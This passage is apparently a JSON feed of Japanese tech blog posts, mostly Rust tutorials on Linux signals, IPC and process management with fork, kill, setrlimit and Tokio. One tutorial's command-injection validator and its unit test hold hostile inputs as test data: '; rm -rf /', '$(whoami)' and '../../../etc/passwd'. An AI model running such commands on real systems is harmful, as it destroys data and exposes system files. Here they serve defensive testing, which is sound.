はじめにAIによって開発が加速した現在、プロダクト開発においてアイデアを素早くプロダクトに落とし込み、実際に市場に展開することが重要になっています。しかしMVP(最小限の実用的製品)を立ち上げる際のクラウドインフラやアーキテクチャの選択は、その後のプロダクトの成長や運用に大きな影響を与えます。本格的な構成を最初期から採用することは立派ですが、MVPが成功するかわからないものに高コストなインフラを選択することはリスクが高いです。逆に、安易に無料枠や低コストなサービスを選択すると、将来的なスケーリングや機能追加が困難になりま...","isoDate":"2025-08-26T02:59:44.000Z","dateMiliSeconds":1756177184000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":" RustでLinuxのシグナル処理とプロセス間通信をしてみた","link":"https://syu-m-5151.hatenablog.com/entry/2025/08/22/155856","contentSnippet":"はじめに前回の記事「RustでLinuxプロセス管理をしてみた」の続編として、今回はシグナル処理とプロセス間通信（IPC）について解説します。これらの技術は、システムプログラミングの根幹をなす重要な概念です。doc.rust-lang.orgサンプルコードはこちらに配置しておきます。github.com2025年の最新動向2025年現在、Rustエコシステムは大きな転換期を迎えています。Linux 6.13が2025年1月にリリースされ、Rustサポートが「転換点」に到達しました。また、非同期ランタイムの世界では、async-stdが2025年3月に廃止されることが決まり、Tokioが事実上の標準となっています。さらに、Rust 1.85ではasync closuresが安定化され、より表現力豊かな非同期処理が可能になりました。1. 基礎知識書籍はこちらがめちゃくちゃに詳しいのでオススメです。ふつうのLinuxプログラミング 第2版　Linuxの仕組みから学べるgccプログラミングの王道作者:青木 峰郎SBクリエイティブAmazonプロセスとはプロセスは「実行中のプログラムのインスタンス」です。皆さんが日常的に使うWebブラウザのタブやターミナルのセッションは、すべてプロセスとして動作しています。各プロセスは独立したメモリ空間を持ち、他のプロセスから直接アクセスすることはできません。これがシステムの安定性と安全性を保証していますが、同時にプロセス間でデータをやり取りする特別な仕組みが必要になる理由でもあります。シグナルとはシグナルは、プロセス間の非同期通知メカニズムです。電話の着信音のように、プロセスに「何か重要なことが起きた」と割り込みで知らせる仕組みだと考えると分かりやすいでしょう。主要なシグナルと実際の用途： シグナル  番号  用途  実例  SIGTERM  15  正常終了要求  systemctl stopで送信される  SIGKILL  9  強制終了  kill -9、OOMキラー  SIGINT  2  割り込み  Ctrl+Cを押したとき  SIGHUP  1  設定再読み込み  nginxやsshdの設定リロード  SIGUSR1/2  10/12  カスタム用途  アプリ固有の動作トリガー シグナルには重要な特徴がいくつかあります。まず非同期性という性質があり、いつ届くか予測できません。また割り込みとして動作するため、実行中の処理を中断して処理されます。そしてシンプルな仕組みで、シグナル番号以外の追加情報を送ることはできません。rust-cli.github.ioプロセス間通信（IPC）とはIPCは、独立したプロセス同士がデータをやり取りするための仕組みです。それぞれの方式には特徴があり、用途に応じて使い分けます： 方式  特徴  実際の使用例  パイプ  単方向、親子プロセス間  ls | grepなどのシェルパイプ  名前付きパイプ  双方向、無関係なプロセス間も可  ログ収集デーモンへのデータ送信  Unix Domain Socket  双方向、高速、信頼性高  Docker、systemd、PostgreSQL  共有メモリ  最速、同期が複雑  データベースのバッファプール  メッセージキュー  非同期、順序保証  ジョブキューシステム 2. シンプルなシグナル処理Ctrl+Cを検知して安全に終了最もシンプルな例から始めてみましょう。Ctrl+Cを押したときに、きちんと後処理をしてから終了するプログラムです。use std::sync::atomic::{AtomicBool, Ordering};use std::sync::Arc;use std::thread;use std::time::Duration;fn main() {    println!(\\"プログラム開始（Ctrl+Cで終了）\\");        // 実行中フラグ（スレッド間で安全に共有）    let running = Arc::new(AtomicBool::new(true));    let r = running.clone();        // Ctrl+Cハンドラーを設定    ctrlc::set_handler(move || {        println!(\\"\\\\n終了シグナルを受信しました\\");        r.store(false, Ordering::SeqCst);    }).expect(\\"シグナルハンドラーの設定に失敗\\");        // メインループ    let mut counter = 0;    while running.load(Ordering::SeqCst) {        counter += 1;        println!(\\"処理中... カウント: {}\\", counter);        thread::sleep(Duration::from_secs(1));    }        println!(\\"プログラムを安全に終了しました\\");}このコードにはいくつかの重要なポイントがあります。まずAtomicBoolを使ってスレッド間で安全にフラグを共有しています。シグナルハンドラーはいつ呼ばれるか分からないため、アトミック操作が必要になります。そしてループを抜けてから終了処理を行うことで、データの整合性を保っています。docs.rsgithub.com複数のシグナルを処理実際のサーバーアプリケーションでは、複数のシグナルを適切に処理する必要があります。use signal_hook::{consts::signal::*, iterator::Signals};use std::{error::Error, thread, time::Duration};fn main() -> Result<(), Box<dyn Error>> {    let mut signals = Signals::new(&[SIGTERM, SIGINT, SIGHUP])?;        thread::spawn(move || {        for sig in signals.forever() {            match sig {                SIGTERM | SIGINT => {                    println!(\\"終了シグナルを受信\\");                    std::process::exit(0);                }                SIGHUP => {                    println!(\\"設定再読み込み\\");                }                _ => unreachable!(),            }        }    });        // メイン処理    loop {        println!(\\"作業中...\\");        thread::sleep(Duration::from_secs(2));    }}docs.rsgithub.com3. プロセス間通信の基礎シンプルなパイプ通信親プロセスから子プロセスへメッセージを送る基本的な例です。use std::io::{Write, Read};use std::process::{Command, Stdio};fn main() -> std::io::Result<()> {    // catコマンドは標準入力をそのまま標準出力に出力    let mut child = Command::new(\\"cat\\")        .stdin(Stdio::piped())        .stdout(Stdio::piped())        .spawn()?;        // 子プロセスに書き込み    if let Some(mut stdin) = child.stdin.take() {        stdin.write_all(b\\"Hello from Rust!\\\\n\\")?;    }        // 結果を読み取り    let output = child.wait_with_output()?;    println!(\\"受信: {}\\", String::from_utf8_lossy(&output.stdout));        Ok(())}パイプには特徴的な性質があります。まず単方向通信であり、データは一方向にのみ流れます。またバッファリング機能があり、OSが自動的にバッファを管理してくれます。そしてブロッキング動作をするため、読み込み側は書き込みを待つことになります。docs.rsUnix Domain Socketより本格的な双方向通信の例です。多くのシステムソフトウェアが採用している方式です。Unix Domain Socketには多くの利点があります。双方向通信が可能で、クライアント・サーバー間で自由にやり取りできます。また、ネットワークスタックを通らないため高速に動作します。そしてファイルシステム上のパスとして存在するため、アクセス制御が簡単に行えます。4. デバッグツールの活用詳解 システム・パフォーマンス 第2版作者:Brendan Greggオーム社Amazonシステムプログラミングにおいて、問題を解決するには、まず問題を観察できなければならないという原則があります。特にシグナル処理やIPCのような非同期的な動作は、従来のprint文デバッグでは限界があります。そこで重要になるのが可観測性（Observability）という概念です。効果的なデバッグには階層的なアプローチが必要です。まずアプリケーション層で何が起きているかを把握し、次にシステムコール層まで掘り下げ、必要に応じてカーネル層まで観察します。各層に適したツールを使い分けることで、最小のオーバーヘッドで最大の洞察を得ることができます。また、動的トレーシングと静的トレーシングを使い分けることも重要です。straceのような動的トレーシングツールは実行中のプロセスをリアルタイムで観察でき、rr-debuggerのような記録再生型ツールは時間を巻き戻して問題の根本原因を特定できます。これらを組み合わせることで、再現困難なバグも確実に捕捉できるようになります。strace - システムコールトレースシグナル処理やIPCのデバッグには、システムコールレベルでの動作確認が不可欠です。# シグナル関連のシステムコールのみ表示strace -e trace=signal,sigaction,kill,pause cargo run# 実際の出力例rt_sigaction(SIGINT, {sa_handler=0x5555555, ...}, NULL, 8) = 0--- SIGINT {si_signo=SIGINT, si_code=SI_KERNEL} ---rt_sigreturn({mask=[]}) = 0straceを使うと様々な情報が見えてきます。シグナルハンドラーの登録状況（sigaction）、シグナルの送受信タイミング、ブロックされたシグナル、そしてシステムコールの引数と戻り値などを確認できます。strace.iorr-debugger（最強のデバッグツール）rrは、GDBを拡張して作られたデバッガで、プログラムの実行を記録し、逆方向にステップ実行できます。# プログラムの実行を記録rr record ./target/debug/my_program# rust-gdbを使って再生rr replay -d rust-gdb# リバース実行のコマンド(rr) reverse-continue  # 逆方向にcontinue(rr) reverse-next      # 逆方向にnextrrが強力な理由はいくつかあります。まず100%再現性があり、非決定的な動作も完全に再現できます。また逆実行機能により、エラーの原因を遡って調査できます。そして低オーバーヘッドで動作するため、実用的な速度で記録が可能です。特にシステムプログラミングでは、「たまにしか起きないエラー」や「データ競合」のデバッグで威力を発揮します。rr-project.orgtokio-console - 非同期ランタイムデバッグ非同期Rustアプリケーションのデバッグには、tokio-consoleが非常に有用です。タスクの状態、実行時間、リソース使用状況をリアルタイムで監視できます。# tokio-consoleをインストールcargo install --locked tokio-console# アプリケーション起動（別ターミナル）RUSTFLAGS=\\"--cfg tokio_unstable\\" cargo run# tokio-consoleで監視tokio-consolegithub.com5. グレイスフルシャットダウン実際のサービスで必要な、適切な終了処理の実装例を見てみましょう。グレイスフルシャットダウンが重要な理由は複数あります。まずデータの整合性を保つため、処理中のタスクを完了してから終了する必要があります。またリソースの解放として、ファイルやソケットを適切にクローズしなければなりません。そして状態の保存により、次回起動時に必要な情報を保存することも重要です。実装する際のポイントとしては、まず新規タスクの受付を停止し、新しい仕事を受け付けないようにします。次に既存タスクの完了を待機し、実行中の処理を最後まで実行させます。その後リソースのクリーンアップを行い、ファイルやネットワーク接続を閉じます。最後に統計情報の出力を行い、ログに実行結果を記録します。6. Tokioを使った非同期グレイスフルシャットダウンモダンなRustアプリケーションでは、Tokioを使った非同期処理が主流です。use tokio::signal;use tokio_util::sync::CancellationToken;#[tokio::main]async fn main() {    let token = CancellationToken::new();        // Ctrl+Cハンドラー    let shutdown_token = token.clone();    tokio::spawn(async move {        signal::ctrl_c().await.unwrap();        println!(\\"シャットダウン開始\\");        shutdown_token.cancel();    });        // メインループ    loop {        tokio::select! {            _ = token.cancelled() => {                println!(\\"終了処理中...\\");                break;            }            _ = do_work() => {                // 通常の処理            }        }    }}async fn do_work() {    // 非同期処理}CancellationTokenには多くの利点があります。階層的なキャンセルが可能で、親トークンをキャンセルすると子もキャンセルされます。また協調的な仕組みにより、各タスクが自分のタイミングで終了できます。そして非同期対応により、async/awaitと自然に統合されています。tokio.rsdocs.rsgithub.comdocs.rstokio.rs7. nixクレートでシステムコールを扱うRustでは、nixクレートを使って安全にUnixシステムコールを扱うことができます。libcクレートの生のAPIをラップし、Rust的な安全なインターフェースを提供しています。use nix::sys::signal::{self, Signal};use nix::unistd::{fork, ForkResult};match fork() {    Ok(ForkResult::Parent { child }) => {        println!(\\"親プロセス、子PID: {}\\", child);    }    Ok(ForkResult::Child) => {        println!(\\"子プロセス\\");    }    Err(_) => eprintln!(\\"fork失敗\\"),}nixクレートを使うことで、エラーハンドリングが適切に行われ、メモリ安全性が保証されます。生のシステムコールを直接扱う必要がなくなり、より安全なコードが書けるようになります。docs.rsgithub.com8. 2025年の新機能：Async ClosuresRust 1.85.0で安定化されたasync closuresを使うと、より柔軟な非同期処理が書けます。async fn retry_with_backoff<F, Fut>(    mut f: F,     max_retries: u32,) -> Result<String>where    F: FnMut() -> Fut,    Fut: Future<Output = Result<String>>,{    for attempt in 1..=max_retries {        match f().await {            Ok(result) => return Ok(result),            Err(e) if attempt < max_retries => {                let backoff = Duration::from_secs(2_u64.pow(attempt - 1));                sleep(backoff).await;            }            Err(e) => return Err(e),        }    }    unreachable!()}async closuresを使うメリットは多岐にわたります。まず簡潔な記述が可能になり、非同期処理を関数引数として渡せるようになります。また型安全であるため、コンパイル時に型チェックが行われます。そして柔軟な制御フローにより、リトライやタイムアウトの実装が簡単になります。実装パターンの選び方シグナル処理の選択基準シグナル処理の実装方法を選ぶ際は、用途に応じて適切なツールを選択することが重要です。単純な終了処理であればctrlcクレートで十分です。複数のシグナルを扱う必要がある場合はsignal-hookを使用します。そして非同期処理と組み合わせる場合は、Tokioのsignalモジュールが最適です。IPC方式の選択基準IPC方式も同様に、用途に応じて選択します。親子プロセス間の単純な通信であればパイプが適しています。高速な双方向通信が必要な場合はUnix Domain Socketを選びます。大量データの共有には共有メモリが最適で、非同期メッセージングにはメッセージキューが向いています。まとめこの記事では、Rustでのシグナル処理とプロセス間通信について、基礎から実践まで段階的に解説しました。重要なポイント今回学んだ重要なポイントを振り返ってみましょう。まず、シグナルは非同期であり、いつ届くか分からないためアトミック操作が必要です。IPCは用途に応じて選ぶ必要があり、速度、双方向性、複雑さのトレードオフを考慮します。グレイスフルシャットダウンはデータの整合性を保つために必須です。straceやrr-debuggerなどのデバッグツールを活用することで、問題を効率的に解決できます。そして、async closuresやCancellationTokenなどの最新機能を活用することで、保守性を向上させることができます。各IPC方式の使い分け実際の開発では、各IPC方式を適切に使い分けることが重要です。パイプはシェルスクリプトとの連携や親子プロセス間の単純な通信に適しています。名前付きパイプはログ収集や順序保証が必要な場合に使います。Unix Domain Socketは高速な双方向通信やサービス間連携に最適です。共有メモリは大量データの高速処理やリアルタイム性が必要な場合に選択します。次のステップこの基礎を踏まえて、さらに高度な実装に挑戦することができます。分散システムへの拡張としてgRPCやメッセージキューの実装、コンテナ環境でのIPC最適化、リアルタイムシステムでの応用、そしてマイクロサービスアーキテクチャでの実装などが考えられます。完全なソースコードはGitHubリポジトリで公開しています。前回の記事「RustでLinuxプロセス管理をしてみた」と合わせて読むことで、Rustでのシステムプログラミングの基礎がしっかりと身につきます。Linuxカーネルプログラミング 第2版作者:Kaiwan N. Billimoria,武内 覚（翻訳）,大岩 尚宏（翻訳）オライリージャパンAmazon","isoDate":"2025-08-22T06:58:56.000Z","dateMiliSeconds":1755845936000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"RustでLinuxプロセス管理をしてみた","link":"https://syu-m-5151.hatenablog.com/entry/2025/08/21/161234","contentSnippet":"はじめにこれまでPythonとGoでプロセス管理システムを実装してきましたが、今回Rustでも実装してみました。各言語にはそれぞれ得意不得意があり、プロジェクトの要件によって最適な選択は変わります。変なとこがあれば教えてください。この記事では、Rustでプロセス管理システムを実装した経験を共有します。標準ライブラリのstd::processだけでは不十分な要件があったため、より高度な制御が可能な実装を行いました。doc.rust-lang.orgサンプルコードはこちらに配置しておきます。github.comPython、Go、Rustでの実装経験から見えた違い3つの言語でプロセス管理を実装してきた経験から、それぞれの特徴をまとめます。Pythonでの実装subprocessモジュールは高レベルで使いやすいasyncioとの組み合わせで非同期処理も可能GILの影響で真の並行性には制限があるメモリ使用量が多く、長時間稼働で増加傾向Goでの実装os/execパッケージはシンプルで直感的goroutineによる並行処理が強力エラーハンドリングが冗長になりがちGCのオーバーヘッドが気になるケースがあるRustでの実装所有権システムによるリソース管理の確実性ゼロコスト抽象化による高パフォーマンス型システムによる実行前のバグ検出学習曲線は確かに急だが、長期的なメンテナンス性は高いRustの所有権システムとゼロコスト抽象化により、今回の要件を満たす堅牢なシステムを構築できました。特に、コンパイル時にリソースリークを防げる点、SendとSyncトレイトによる安全な並行処理、システムコールのオーバーヘッドが最小限である点が優れていました。1. まずはstd::processから始めよう最初の一歩：シンプルなコマンド実行Rustでプロセスを扱う最も簡単な方法は、標準ライブラリのstd::process::Commandを使うことです。use std::process::Command;fn main() {    // 最もシンプルな例    let output = Command::new(\\"echo\\")        .arg(\\"Hello, Rust!\\")        .output()        .expect(\\"Failed to execute command\\");        println!(\\"stdout: {}\\", String::from_utf8_lossy(&output.stdout));}パイプを使った入出力制御もう少し複雑な例として、子プロセスとパイプで通信してみましょう。use std::io::Write;use std::process::{Command, Stdio};fn main() -> std::io::Result<()> {    let mut child = Command::new(\\"cat\\")        .stdin(Stdio::piped())        .stdout(Stdio::piped())        .spawn()?;        // 標準入力に書き込み    if let Some(mut stdin) = child.stdin.take() {        stdin.write_all(b\\"Hello from parent process!\\\\n\\")?;    }        // 出力を取得    let output = child.wait_with_output()?;    println!(\\"Child said: {}\\", String::from_utf8_lossy(&output.stdout));        Ok(())}std::processの限界しかし、実際のプロジェクトを進めていくと、std::processだけでは対応できない要件が出てきました。// ❌ std::processではできないこと// 1. 特定のシグナル（SIGTERM、SIGUSR1など）を送信できない// child.kill() はSIGKILLのみ// 2. プロセスグループの管理ができない// 複数の子プロセスをグループとして扱えない// 3. fork()が使えない// Unix系OSの基本的なプロセス生成方法が使えない// 4. 細かいリソース制限（CPU時間、メモリ量など）の設定ができない2. nixクレートの導入：なぜ必要なのかnixクレートとはnixクレートは、Unix系システムコールのRustラッパーです。std::processでは提供されていない低レベルな制御が可能になります。docs.rs[dependencies]nix = { version = \\"0.27\\", features = [\\"process\\", \\"signal\\"] }最初のnixプログラム：fork()の基本まずは最も基本的なfork()から始めましょう。fork()は現在のプロセスを複製し、親プロセスと子プロセスの2つに分岐します。use nix::unistd::{fork, ForkResult};fn main() -> Result<(), Box<dyn std::error::Error>> {    println!(\\"親プロセス開始: PID={}\\", std::process::id());        // fork()は unsafe - プロセスの複製は危険を伴うため    match unsafe { fork() }? {        ForkResult::Parent { child } => {            // 親プロセスのコード            println!(\\"親: 子プロセス {} を作成しました\\", child);        }        ForkResult::Child => {            // 子プロセスのコード            println!(\\"子: 私は新しいプロセスです！PID={}\\", std::process::id());            std::process::exit(0); // 子プロセスは明示的に終了        }    }        Ok(())}なぜunsafeなのか？fork()がunsafeな理由を理解することは重要です。メモリの複製: fork時点のメモリ状態が複製されるマルチスレッドとの相性問題: スレッドがある状態でforkすると予期しない動作リソースの重複: ファイルディスクリプタなどが複製される3. 段階的に学ぶnixクレートの機能ステップ1: シグナル送信std::processではできなかったシグナル送信を実装してみます。use nix::sys::signal::{kill, Signal};use nix::unistd::Pid;use std::process::Command;use std::thread;use std::time::Duration;fn main() -> Result<(), Box<dyn std::error::Error>> {    // 子プロセスを起動    let mut child = Command::new(\\"sleep\\")        .arg(\\"30\\")        .spawn()?;        let pid = Pid::from_raw(child.id() as i32);    println!(\\"子プロセス起動: PID={}\\", pid);        // 2秒待ってからSIGTERMを送信    thread::sleep(Duration::from_secs(2));    println!(\\"SIGTERMを送信...\\");    kill(pid, Signal::SIGTERM)?;        // プロセスの終了を確認    let status = child.wait()?;    println!(\\"子プロセス終了: {:?}\\", status);        Ok(())}ステップ2: プロセスの終了を待つ（ゾンビプロセスの防止）プロセスが終了しても、親がwait()しないとゾンビプロセスになります。nixを使った適切な処理方法を見てみましょう。use nix::sys::wait::waitpid;use nix::unistd::{fork, ForkResult};fn main() -> Result<(), Box<dyn std::error::Error>> {    match unsafe { fork() }? {        ForkResult::Parent { child } => {            println!(\\"親: 子プロセス {} の終了を待機\\", child);                        // waitpid()で子プロセスの終了を待つ            // これによりゾンビプロセスを防ぐ            let status = waitpid(child, None)?;            println!(\\"親: 子プロセスが終了 - {:?}\\", status);        }        ForkResult::Child => {            println!(\\"子: 2秒間作業します...\\");            std::thread::sleep(std::time::Duration::from_secs(2));            println!(\\"子: 作業完了！\\");            std::process::exit(0);        }    }        Ok(())}ステップ3: プロセスグループの管理複数のプロセスをグループとして管理し、まとめてシグナルを送信できます。use nix::sys::signal::{killpg, Signal};use nix::unistd::{fork, setpgid, ForkResult, Pid};fn main() -> Result<(), Box<dyn std::error::Error>> {    match unsafe { fork() }? {        ForkResult::Parent { child } => {            // 子プロセスを新しいプロセスグループのリーダーにする            setpgid(child, child)?;            println!(\\"親: プロセスグループ {} を作成\\", child);                        // さらに子プロセスを同じグループに追加（省略）                        // グループ全体にシグナルを送信            std::thread::sleep(std::time::Duration::from_secs(2));            println!(\\"親: グループ全体にSIGTERMを送信\\");            killpg(child, Signal::SIGTERM)?;        }        ForkResult::Child => {            // 新しいプロセスグループを作成            let my_pid = nix::unistd::getpid();            setpgid(my_pid, my_pid)?;                        // グループ内で作業            loop {                std::thread::sleep(std::time::Duration::from_secs(1));                println!(\\"子: 作業中...\\");            }        }    }        Ok(())}4. 実用的な実装：ProcessGuardパターンRAIIを活用した安全なプロセス管理実際のプロジェクトでは、プロセスのライフサイクルを確実に管理する必要があります。こういうのは世の中に知見がたくさんあるのでちゃんと調べて行きましょう。今回はRustのRAII（Resource Acquisition Is Initialization）パターンを活用しましょう。use nix::sys::signal::{kill, Signal};use nix::unistd::Pid;use std::process::{Child, Command};/// プロセスの自動クリーンアップを保証する構造体pub struct ProcessGuard {    child: Option<Child>,    name: String,}impl ProcessGuard {    pub fn new(command: &str) -> std::io::Result<Self> {        let child = Command::new(command).spawn()?;        Ok(Self {            child: Some(child),            name: command.to_string(),        })    }        pub fn wait(&mut self) -> std::io::Result<std::process::ExitStatus> {        if let Some(mut child) = self.child.take() {            child.wait()        } else {            Err(std::io::Error::new(                std::io::ErrorKind::Other,                \\"Process already terminated\\"            ))        }    }}impl Drop for ProcessGuard {    fn drop(&mut self) {        if let Some(mut child) = self.child.take() {            // まだ実行中かチェック            if child.try_wait().ok().flatten().is_none() {                eprintln!(\\"Terminating process: {}\\", self.name);                                // まずSIGTERMで優雅に終了を試みる                let pid = Pid::from_raw(child.id() as i32);                let _ = kill(pid, Signal::SIGTERM);                                // 少し待つ                std::thread::sleep(std::time::Duration::from_millis(500));                                // まだ生きていればSIGKILL                if child.try_wait().ok().flatten().is_none() {                    let _ = child.kill();                }                                // 必ずwait()してゾンビプロセスを防ぐ                let _ = child.wait();            }        }    }}// 使用例fn main() -> std::io::Result<()> {    {        let mut guard = ProcessGuard::new(\\"sleep\\")?;        println!(\\"プロセスを起動しました\\");                // スコープを抜けると自動的にクリーンアップ    } // ここでDropが呼ばれる        println!(\\"プロセスは自動的に終了されました\\");    Ok(())}5. セキュリティ：入力検証とサニタイゼーションコマンドインジェクション対策ユーザー入力を含むコマンド実行は非常に危険です。悪意がなくても失敗する可能性があるものはいつか失敗します。ちなみに普通に入力は適切な検証が必要です。use thiserror::Error;#[derive(Error, Debug)]pub enum ProcessError {    #[error(\\"Invalid input: {0}\\")]    InvalidInput(String),        #[error(\\"Security violation: {0}\\")]    SecurityViolation(String),        #[error(\\"IO error: {0}\\")]    Io(#[from] std::io::Error),}/// 安全な入力検証pub fn validate_input(input: &str) -> Result<&str, ProcessError> {    // 危険な文字をチェック    const DANGEROUS_CHARS: &[char] = &[        \';\', \'&\', \'|\', \'$\', \'`\', \'>\', \'<\',         \'(\', \')\', \'{\', \'}\', \'\\\\n\', \'\\\\r\', \'\\\\0\'    ];        for &ch in DANGEROUS_CHARS {        if input.contains(ch) {            return Err(ProcessError::SecurityViolation(                format!(\\"Dangerous character \'{}\' detected\\", ch)            ));        }    }        // パストラバーサル対策    if input.contains(\\"..\\") || input.starts_with(\'~\') {        return Err(ProcessError::SecurityViolation(            \\"Path traversal detected\\".into()        ));    }        // コマンド置換パターンをチェック    let dangerous_patterns = [\\"$(\\", \\"${\\", \\"&&\\", \\"||\\"];    for pattern in dangerous_patterns {        if input.contains(pattern) {            return Err(ProcessError::SecurityViolation(                format!(\\"Dangerous pattern \'{}\' detected\\", pattern)            ));        }    }        Ok(input)}// 使用例fn safe_execute(user_input: &str) -> Result<(), ProcessError> {    let safe_input = validate_input(user_input)?;        let output = std::process::Command::new(\\"echo\\")        .arg(safe_input)        .output()?;        println!(\\"Safe output: {}\\", String::from_utf8_lossy(&output.stdout));    Ok(())}リソース制限の設定www.linkedin.comプロセスが使用できるリソースを制限することで、システム全体への影響を防げます。#[cfg(target_os = \\"linux\\")]use nix::sys::resource::{setrlimit, Resource};#[cfg(target_os = \\"linux\\")]fn set_resource_limits() -> nix::Result<()> {    // CPU時間を10秒に制限    setrlimit(Resource::RLIMIT_CPU, 10, 10)?;        // メモリを100MBに制限    let memory_limit = 100 * 1024 * 1024; // 100MB in bytes    setrlimit(Resource::RLIMIT_AS, memory_limit, memory_limit)?;        // プロセス数を50に制限    setrlimit(Resource::RLIMIT_NPROC, 50, 50)?;        Ok(())}6. 高度な実装例：プロセスプール複数のワーカープロセスを管理実際のシステムでは、複数のワーカープロセスを効率的に管理する必要があります。use std::sync::{Arc, Mutex};use std::collections::HashMap;use nix::unistd::Pid;pub struct ProcessPool {    workers: Arc<Mutex<HashMap<Pid, ProcessGuard>>>,    max_workers: usize,}impl ProcessPool {    pub fn new(max_workers: usize) -> Self {        Self {            workers: Arc::new(Mutex::new(HashMap::new())),            max_workers,        }    }        pub fn spawn_worker(&self, command: &str) -> Result<Pid, ProcessError> {        let mut workers = self.workers.lock().unwrap();                if workers.len() >= self.max_workers {            return Err(ProcessError::InvalidInput(                \\"Maximum workers reached\\".into()            ));        }                let child = std::process::Command::new(command)            .spawn()            .map_err(|e| ProcessError::Io(e))?;                let pid = Pid::from_raw(child.id() as i32);        let guard = ProcessGuard {            child: Some(child),            name: command.to_string(),        };                workers.insert(pid, guard);        Ok(pid)    }        pub fn terminate_worker(&self, pid: Pid) -> Result<(), ProcessError> {        let mut workers = self.workers.lock().unwrap();                if let Some(mut guard) = workers.remove(&pid) {            guard.wait()?;            Ok(())        } else {            Err(ProcessError::InvalidInput(                \\"Worker not found\\".into()            ))        }    }        pub fn active_workers(&self) -> usize {        self.workers.lock().unwrap().len()    }}// 使用例fn main() -> Result<(), Box<dyn std::error::Error>> {    let pool = ProcessPool::new(5);        // ワーカーを起動    for i in 0..3 {        let pid = pool.spawn_worker(\\"sleep\\")?;        println!(\\"Started worker {}: PID={}\\", i, pid);    }        println!(\\"Active workers: {}\\", pool.active_workers());        // プールがスコープを抜けると全ワーカーが自動終了    Ok(())}7. 非同期処理との統合（Tokio）Tokioを使った非同期プロセス管理docs.rs大規模なシステムでは、非同期処理と組み合わせることが重要です。use tokio::process::Command;use tokio::time::{timeout, Duration};#[tokio::main]async fn main() -> Result<(), Box<dyn std::error::Error>> {    // 非同期でコマンド実行    let output = Command::new(\\"echo\\")        .arg(\\"Hello, async!\\")        .output()        .await?;        println!(\\"Output: {}\\", String::from_utf8_lossy(&output.stdout));        // タイムアウト付き実行    let result = timeout(        Duration::from_secs(2),        Command::new(\\"sleep\\").arg(\\"10\\").output()    ).await;        match result {        Ok(Ok(_)) => println!(\\"Command completed\\"),        Ok(Err(e)) => println!(\\"Command failed: {}\\", e),        Err(_) => println!(\\"Command timed out\\"),    }        Ok(())}8. デバッグとテスト単体テストの実装プロセス管理のコードは、適切にテストすることが重要です。#[cfg(test)]mod tests {    use super::*;    use std::time::Instant;        #[test]    fn test_input_validation() {        // 安全な入力        assert!(validate_input(\\"hello.txt\\").is_ok());                // 危険な入力        assert!(validate_input(\\"; rm -rf /\\").is_err());        assert!(validate_input(\\"$(whoami)\\").is_err());        assert!(validate_input(\\"../../../etc/passwd\\").is_err());    }        #[test]    fn test_process_timeout() {        let start = Instant::now();                let mut guard = ProcessGuard::new(\\"sleep\\").unwrap();                // 1秒でタイムアウト        std::thread::sleep(std::time::Duration::from_secs(1));        drop(guard); // 強制的にDropを呼ぶ                // 2秒以内に終了していることを確認        assert!(start.elapsed() < std::time::Duration::from_secs(2));    }        #[test]    fn test_process_pool() {        let pool = ProcessPool::new(2);                // 最大数まで起動できることを確認        assert!(pool.spawn_worker(\\"true\\").is_ok());        assert!(pool.spawn_worker(\\"true\\").is_ok());                // 最大数を超えるとエラー        assert!(pool.spawn_worker(\\"true\\").is_err());    }}統合テスト実際のプロセスを起動して動作を確認します。// tests/integration_test.rsuse std::process::Command;use std::time::Duration;#[test]fn test_zombie_prevention() {    // 子プロセスを起動    let mut child = Command::new(\\"sh\\")        .arg(\\"-c\\")        .arg(\\"sleep 0.1\\")        .spawn()        .expect(\\"Failed to spawn\\");        // プロセスの終了を待つ    let status = child.wait().expect(\\"Failed to wait\\");    assert!(status.success());        // psコマンドでゾンビプロセスがないことを確認    let output = Command::new(\\"ps\\")        .arg(\\"aux\\")        .output()        .expect(\\"Failed to run ps\\");        let ps_output = String::from_utf8_lossy(&output.stdout);    assert!(!ps_output.contains(\\"<defunct>\\"));}まとめRustでプロセス管理システムを実装する際のポイントをまとめます。std::processから始める簡単な用途には標準ライブラリで十分パイプや環境変数の設定も可能多くの場合、これだけで要件を満たせるnixクレートが必要な場面シグナルの細かい制御が必要プロセスグループの管理fork()やexec()の直接的な使用リソース制限の設定実装のベストプラクティスRAIIパターンの活用: ProcessGuardでリソースの自動解放入力検証の徹底: コマンドインジェクション対策エラーハンドリング: thiserrorで構造化されたエラーテストの充実: 単体テストと統合テストの両方Rustの優位性メモリ安全性: 所有権システムによる確実なリソース管理ゼロコスト抽象化: 高レベルAPIでも性能劣化なし型システム: コンパイル時のバグ検出並行性: Send/Syncトレイトによる安全な並行処理長期運用するシステムでは、これらの特性が大きなメリットとなります。特に、ゾンビプロセスの防止やリソースリークの回避が、コンパイル時に保証される点は、運用の安定性に大きく貢献します。The Linux Programming Interface: A Linux and UNIX System Programming Handbook作者:Kerrisk, MichaelNo Starch PressAmazonLinuxプログラミングインタフェース作者:Michael KerriskオライリージャパンAmazon今後は、分散システムでのプロセス管理や、より高度なモニタリング機能の実装を予定しています。Rustのエコシステムは急速に発展しており、プロセス管理の分野でも新しい可能性が広がっています。github.com","isoDate":"2025-08-21T07:12:34.000Z","dateMiliSeconds":1755760354000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"DockerからECSへ 〜 AWSの海に出る前に知っておきたいこと 〜","link":"https://speakerdeck.com/ota1022/dockerkaraecshe-awsnohai-nichu-ruqian-nizhi-tuteokitaikoto","contentSnippet":"JAWS-UGコンテナ支部 入門編 #8 初心者大歓迎LT大会のLT登壇資料です。\\rhttps://jawsug-container.connpass.com/event/361918/","isoDate":"2025-08-21T04:00:00.000Z","dateMiliSeconds":1755748800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"Gemma3 270M がでたらしいのでスペックを見てみる","link":"https://zenn.dev/satohjohn/articles/0866bbd4b2cefa","contentSnippet":"概要説明を見ている限り LLM にしてはめちゃくちゃ軽いなという印象があります（桁が違う）がそれがどういうことなのかを見てみます。 3行まとめローカル(M3 MacBook Pro のメモリ 16GB)で動かす分に関しては全く問題なく動かせる。普通のアプリケーション動かすのと大差なく周りに影響もないシンプルなユースケースに限られる。（後に検証Cloud Run GPU NVIDIA L4 1台で十分スピード感出せる (簡単な文章 200ms程度で返却できるイメージ) docker で動かすモデルが https://hub.docker.com/r/ai/gemm...","isoDate":"2025-08-17T15:17:18.000Z","dateMiliSeconds":1755443838000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Google Cloud RunのDocker 